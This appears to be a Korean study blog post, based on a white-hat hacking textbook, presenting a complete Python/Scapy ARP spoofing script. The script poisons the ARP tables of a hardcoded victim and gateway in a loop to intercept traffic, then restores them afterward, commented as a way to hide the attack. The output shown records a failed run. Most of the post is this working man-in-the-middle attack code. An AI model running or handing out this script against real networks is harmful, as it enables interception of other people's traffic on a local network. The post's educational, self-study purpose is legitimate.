---
title: "Cryptography: 스푸핑"
last_modified_at: 2020-10-13T00:26:02-05:00
categories:
  - Cryptography
tags:
  - 암호학
  - 파이썬
  - 암호와 해킹 1판
toc: true 
toc_label: "Table of Contents"
toc_icon: "cog"
toc_sticky: true 
author_profile: true 
read_time: false 
---

`이 게시물은 화이트해커를 위한 암호와 해킹 1판을 참고하여 작성하였습니다.`

---
### 스푸핑을 구현해보자
---

실험이 잘 안되었다. 다음에 리눅스를 활용하여 실험까지도 해보자
{: .notice}

```python
from scapy.all import *
from time import sleep
#from scapy.layers.12 import Ether, ARP

def getMAC(ip): #맥주소를 얻는 과정 
    ans, unans = srp(Ether(dst='ff-ff-ff-ff-ff-ff')/ARP(pdst=ip), timeout=5, retry=3)
    for s, r in ans:
        return r.sprintf('%Ether.src%')
        
def poisonARP(srcip, targetip, targetmac):
    arp=ARP(op=2, psrc=srcip, pdst=targetip, hwdst=targetmac)
    #arp reply를 srcip 주소로 targetip에 전송하여 목적지 mac주소를 targetmac으로 지정
    send(arp)
  
def restoreARP(victimip, gatewayip, victimmac, gatewaymac):
    #피해를 입었는지 모르게 복구
    arp1=ARP(op=2, psrc=gatewayip, pdst=victimip, hwdst='ff-ff-ff-ff-ff-ff', hwsrc=gatewaymac)
    #arp1은 희생자 컴퓨터의 ARP 테이블에서 게이트웨이 MAC주소를 원래대로 복구하기 위한 ARP패킷
    arp2=ARP(op=2, psrc=victimip, pdst=gatewayip, hwdst='ff-ff-ff-ff-ff-ff', hwsrc=victimmac)
    #arp2는 게이트웨이 ARP 테이블에서 피해 컴퓨터의 MAC 주소를 원래대로 복구하기 위한 ARP패킷
    send(arp1, count=3)
    send(arp2, count=3)

def main():
    gatewayip='192.168.0.1'
    victimip ='192.168.0.65'
    
    victimmac=getMAC(victimip) #맥주소를 얻어온다.
    gatewaymac=getMAC(gatewayip)
    
    if victimmac == None or gatewaymac == None: #맥주소를 얻는데 실패했을 경우
        print('MAC주소를 찾을 수 없습니다')
        return
    print('ARP Spoofing start -> Victim IP [%s]' %victimip) #맥주소를 얻었을 경우
    print('[%s]: Poison ARP Table [%s] -> [%s]' %(victimip, gatewaymac, victimmac))
    
    try:
        while True:
            poisonARP(gatewayip, victimip, victimmac) #스푸핑을 시작한다
            poisonARP(victimip, gatewayip, gatewaymac)
            sleep(3)
    except KeyboardInterrupt:
        restoreARP(victimip, gatewayip, victimmac, gatewaymac)
        print('ARP Spoogin done -> Restored ARP Table')
        
if __name__ == '__main__':
    main()
```
```
Begin emission:
.............Begin emission:
.......Begin emission:
................Begin emission:
.*
Received 38 packets, got 1 answers, remaining 0 packets
Begin emission:
......Begin emission:
.....Begin emission:
.....Begin emission:
........
Received 24 packets, got 0 answers, remaining 1 packets
MAC주소를 찾을 수 없습니다
```